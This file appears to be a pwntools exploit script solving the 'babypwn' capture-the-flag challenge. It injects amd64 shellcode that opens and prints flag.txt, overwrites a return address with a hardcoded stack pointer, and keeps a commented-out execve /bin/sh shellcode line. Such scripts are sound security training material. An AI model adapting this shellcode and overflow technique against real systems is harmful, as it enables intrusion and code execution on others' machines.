from pwn import *
import sys
import os
from binascii import hexlify

remote_ip,port = 'chal.cybersecurityrumble.de','1990'
binary = 'babypwn'
brkpts = '''
'''

if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary)
    gdb.attach(io,brkpts)

context.arch = 'amd64'

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)


if __name__== "__main__":

    #shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    shellcode = ''
    shellcode += asm("""
    mov rax,2
    mov rdi,rsp
    mov rsi,0
    syscall""")

    shellcode += asm("""
    mov rdi,rax
    mov rax,0
    lea rsi,[rsp-0x100]
    mov rdx,0x100
    syscall

    mov rax,1
    mov rdi,1
    syscall""")

    payload = hexlify(shellcode)
    payload = payload.ljust(240,b"f")
    
    payload += hexlify(p64(0x7fffffffd8d0))
    payload += '//flag.txt\0\0'.encode("hex")

    sla('return.\n',payload)    

    io.interactive()
